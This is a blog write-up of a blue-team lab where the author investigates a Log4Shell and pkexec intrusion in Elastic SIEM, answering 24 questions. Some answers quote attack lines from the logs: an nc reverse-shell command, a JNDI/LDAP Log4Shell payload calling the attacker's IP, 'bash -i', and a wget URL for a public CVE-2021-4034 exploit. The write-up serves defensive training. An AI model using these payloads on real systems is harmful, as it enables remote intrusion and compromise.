---
title: "CyberDefender Elastic-Case"
date: 2023-12-16 00:00:00 +0800
categories: [Blogs, Incident Response]
tags: [CyberDefender, Incident Response ]
---

CyberDefenders is a platform that is used for BlueTeam Training. The Elastic-Case Lab, now expired, shows how a Log4Shell can be seen through the Elastic SIEM. Thought it has been out a few years, this exploit is still used in the wild. On December 11, 2023 it was reported by BleepingComputer that the Lazarus group had released a new RAT using this exploit. BleepingComputer also wrote that roughly 38% of applications using the Apache Log4j library are using a vulnerable version.  

Scenario:

An attacker was able to trick an employee into downloading a suspicious file and running it. The attacker compromised the system, along with that, The Security Team did not update most systems. The attacker was able to pivot to another system and compromise the company. As a SOC analyst, you are assigned to investigate the incident using Elastic as a SIEM tool and help the team to kick out the attacker.

### What is Log4j and Log4Shell? 
* Log4j is a Java-based logging utility. Log4Shell(CVE-2021-44228) is a vulnerability in Log4j which allowed for remote code execution. 

<p><a href="https://www.ibm.com/topics/log4shell"> IBM Log4Shell Explanation</a></p>

# <b> 1. Who downloads the malicious file which has a double extension? </b>

For this problem, I checked the Alerts tab of the security section in Kibana. I filtered by the "Malware Detection Alert" rule and found ahmed to be the user that downloaded the malicious file.

# <b> 2. What is the hostname he was using? </b>

Clicking view details on the initial download alert, DESKTOP-Q1SL9P2 is the hostname that was used. 

# <b> 3. What is the name of the malicious file? </b>

The malicious file name, as shown in the details section, is 'Acount_details.pdf.exe' .

# <b> 4. What is the attacker's IP address? </b>

Using the Analyze Event feature in Kibana, the 11 network events for 'Acount_details.pdf.exe' show that the IP Address is 192.168.1.10.

# <b> 5. Another user with high privilege runs the same malicious file. What is the username? </b>

Returning to the Alerts tab, it is shown that the other user to run the malicious file is cybery. 

# <b> 6. The attacker was able to upload a DLL file of size 8704. What is the file name? </b>

Given the provided details, a query can be used to find the file. "file.extension: "dll" and file.size: 8704". This results in the two alerts showing the mCblHDgWP.dll file. 

# <b> 7. What parent process name spawns cmd with NT AUTHORITY privilege and pid 10716? </b>
Using the Analyze Event feature on the .dll file, a process "rundll32.exe" is shown spawning two cmd processes, one of which being the cmd with NT AUTHORITY and pid 10716.


# <b> 8. The previous process was able to access a registry. What is the full path of the registry? </b>

Selecting the registry section of the rundll32.exe process shows the full path to be HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled. 

# <b> 9. PowerShell process with pid 8836 changed a file in the system. What was that filename? </b>

While analyzing the event, checking the file activity for powershell.exe shows that there was a file change to 'ModuleAnalysisCache'. 

# <b> 10. PowerShell process with pid 11676 created files with the ps1 extension. What is the file that has been created? </b>

Looking at the other PowerShell process, it shows the file created was __PSScriptPolicyTest_bymwxuft.3b5.ps1

# <b> 11. What is the machine's IP address that is in the same LAN as a windows machine? </b>

The query 'host.ip: 192.168.10.0/24' shows the other machine to ubuntu, with the given ip address being 192.168.10.30

# <b> 12. The attacker login to the Ubuntu machine after a brute force attack. What is the username he was successfully login with? </b>

Looking at the hosts authentications in the security section, there are signs of a potential brute-force attack with 94 success authentications and 520 failed. The account that was successfully brute-forced was salem.

# <b> 13. After that attacker downloaded the exploit from the GitHub repo using wget. What is the full URL of the repo? </b>

Using the query 'process.args: "wget" and user.name: "salem" shows that URL to be https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py

# <b> 14. After the attacker runs the exploit, which spawns a new process caled pkexec, what is the process's md5 hash? </b>

3a4ad518e9e404a6bad3d39dfebaf2f6

# <b> 15. Then attacker gets an interactive shell by running a specific command on the process id 3011 with the root user. What is the command? </b>

bash -i

# <b> 16. What is the hostname which alert signal.rule.name: "Netcat Network Activity"? </b>

CentOS

# <b> 17. What is the username who ran netcat? </b>

solr

# <b> 18. What is the parent process name of netcat? </b>

java

# <b> 19. If you focus on nc process, you can get the entire command that the attacker ran to get a reverse shell. Write the full command? </b>

nc -e /bin/bash 192.168.1.10 9999

# <b> 20. From the previous three questions, you may remember a famous java vulnerability. What is it? </b>

A quick search shows the vulnerability is Log4Shell.

# <b> 21. What is the entire log file path of the "solr" application? </b>

/var/solr/logs/solr.log

# <b> 22. What is the path that is vulnerable to log4j? </b>

/admin/cores

# <b> 23. What is the GET request parameter used to deliver log4j payload? </b>

foo

# <b> 24. What is the JNDI payload that is connected to the LDAP port? </b>

{foo=${jndi:ldap://192.168.1.10:1389/Exploit}}

